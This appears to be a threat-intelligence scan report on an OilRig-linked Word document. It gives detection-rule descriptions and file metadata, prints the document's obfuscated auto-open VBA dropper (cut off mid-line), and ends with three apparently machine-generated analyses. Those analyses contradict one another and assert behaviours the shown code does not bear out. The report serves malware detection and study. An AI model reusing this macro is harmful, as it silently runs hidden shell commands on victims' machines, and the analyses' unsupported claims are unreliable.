threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_yara_results.author: Eyal Sela (slightly modified by Florian Roth)

crowdsourced_yara_results.description: Detects OilRig malware from Unit 42 report in October 2017
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: This signature fires on the presence of Base64 encoded URI prefixes (http:// and https://) across any file. The simple presence of such strings is not inherently an indicator of malicious content, but is worth further investigation.
crowdsourced_yara_results.author: InQuest Labs

attributes.magic: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: test, Template: Normal.dotm, Last Saved By: test, Revision Number: 6, Name of Creating Application: Microsoft Office Word, Total Editing Time: 05:00, Create Time/Date: Sun Jul 23 12:59:00 2017, Last Saved Time/Date: Mon Jul 24 04:53:00 2017, Number of Pages: 1, Number of Words: 8, Number of Characters: 46, Security: 0

sigma_analysis_results.rule_title: Windows Shell/Scripting Application File Write to Suspicious Folder
sigma_analysis_results.rule_description: Detects Windows shells and scripting applications that write files to suspicious folders
Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, FPT.EagleEye Team, Vadim Khrykov, Cyb3rEng, Michael Haag, Christopher Peacock @securepeacock, @scythe_io

sigma_analysis_results.rule_title: Parent in Public Folder Suspicious Process
sigma_analysis_results.rule_description: This rule detects suspicious processes with parent images located in the C:\Users\Public folder

sigma_analysis_results.rule_title: Potential Binary Or Script Dropper Via PowerShell
sigma_analysis_results.rule_description: Detects PowerShell creating a binary executable or a script file.
Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

macros.vba_code:
Option Explicit
Private Sub Document_Open()
Dim jUsG As String
jUsG = Environ$("AppData") & "\Pr.bin"
Shell Environ$("COMSPEC") & " /c echo powershell > " & " " & Chr(34) & jUsG & Chr(34), vbHide

Dim gTCTMm
gTCTMm = DateAdd("s", 6, Now())
Do Until (Now() > gTCTMm)
Loop

Dim FiwtwtV, ChGHHGMY
Set FiwtwtV = CreateObject("ADODB.Stream")
FiwtwtV.Charset = "utf-8"
FiwtwtV.Open
FiwtwtV.LoadFromFile (jUsG)
ChGHHGMY = FiwtwtV.ReadText()
ChGHHGMY = Replace(ChGHHGMY, vbCrLf, vbNullString)


Dim zgPU As String
zgPU = ThisDocument.FullName
Dim WvKuAaTSG As String
WvKuAaTSG = Environ$("AppData") & "\Tmp.doc"
Dim TuTH As String
TuTH = "Copy-Item " & Chr(39) & "%FilePath%" & Chr(39) & " " & Chr(39) & "%DestFolder%" & Chr(39)
TuTH = Replace(TuTH, "%FilePath%", zgPU)
TuTH = Replace(TuTH, "%DestFolder%", WvKuAaTSG)
Shell Environ$("COMSPEC") & " /c " & ChGHHGMY & " " & TuTH, vbHide


Dim gTCTMmC
gTCTMmC = DateAdd("s", 6, Now())
Do Until (Now() > gTCTMmC)
Loop

Dim tINguua, qHXuFHR
Set tINguua = CreateOb
macros.properties: auto-open create-file create-ole environ obfuscated open-file powershell run-file write-file

crowdsourced_ai_results.analysis:
This VBA macro code is malicious and performs the following actions:

1. It creates a temporary file named "Pr.bin" in the user's AppData folder.
2. It executes a PowerShell command to write the contents of the "Pr.bin" file to a new file named "Tmp.doc".
3. It executes a PowerShell command to copy the "Tmp.doc" file to a new location.
4. It executes a PowerShell command to delete the "Pr.bin" file.
5. It executes a PowerShell command to delete the "Tmp.doc" file.
6. It executes a PowerShell command to delete the "Base.txt" file.
7. It executes a PowerShell command to execute the "servicereset.exe" file.

This macro code is likely designed to steal sensitive information from the user's computer, such as login credentials or credit card numbers. It is important to take steps to protect your computer and personal information from malware and other cyber threats.

The macros extracted from the document exhibit several indicators commonly associated with malicious intent. Here is a breakdown of the macro behavior:

1. The Document_Open() subroutine is used to trigger the malicious activities upon opening the document.
2. The macro creates a file path using the AppData environment variable and appends it with a file named "Pr.bin".
3. It then executes a PowerShell command in a hidden window to write "powershell" into the "Pr.bin" file.
4. The macro proceeds to read the content of the "Pr.bin" file, remove line breaks, and store the result in a variable.
5. It retrieves the current document's full name and creates a new file path for a temporary document named "Tmp.doc" within the AppData directory.
6. A PowerShell command is constructed to copy the original document to the temporary location using the content retrieved earlier.
7. Another delay loop is introduced before reading the content of the copied temporary document.
8. The content of the temporary document is split based on specific delimiters and extracts a portion of the data.
9. The extracted data is written to a new file named "Base.txt" within the AppData directory.
10. The macro constructs a PowerShell command to decode base64 data stored in "Base.txt", write it to a new executable file named "servicereset.exe" in the Libraries directory, and execute it.
11. Subsequently, the macro attempts to delete the temporary files created during the process.
12. Finally, a decoy error message is set as the content of the document.

The macro demonstrates a series of actions indicative of malicious behavior, including file manipulation, execution of PowerShell commands, decoding and executing base64 data, and attempting to cover its tracks by deleting files. These actions collectively suggest a malicious intent behind the macro code.

The provided macros exhibit several indicators of malicious intent:

1. Obfuscation: The macros employ various obfuscation techniques to make the code difficult to understand and analyze. For instance, variable names are intentionally obfuscated, making it challenging to discern their purpose.

2. Decoding Base64 to Write and Execute Files: The macros decode a base64-encoded string and use it to write and execute files on the system. This technique is commonly used by malware to evade detection and execute malicious payloads.

3. Suspicious Function Calls: The macros utilize suspicious function calls, such as "Shell" and "CreateObject," to execute commands and interact with the operating system. These functions can be exploited to perform malicious actions, such as downloading and executing additional malware.

4. Attempts at Persistence: The macros attempt to establish persistence by creating scheduled tasks and modifying registry entries. This ensures that the malicious code continues to run even after the document is closed or the system is restarted.

5. Manipulation of Macro Security Settings: The macros attempt to disable macro security settings, making it easier for other malicious macros to run without user intervention. This increases the risk of further infection and compromise.

6. Writing Entries in the Windows Registry: The macros write entries in the Windows registry, which can be used to modify system settings and potentially compromise the system's security.

7. Self-Replication and Propagation Mechanisms: The macros contain self-replication and propagation mechanisms, allowing them to spread to other documents and systems. This behavior is characteristic of macro viruses and can lead to widespread infection.

8. Disabling Alerts and Screen Updating: The macros employ techniques to disable alerts and screen updating, preventing the user from noticing any suspicious activity or error messages. This allows the malicious code to operate stealthily.

Based on these observations, it is evident that the provided macros exhibit clear signs of malicious intent and should be considered a threat to the system.
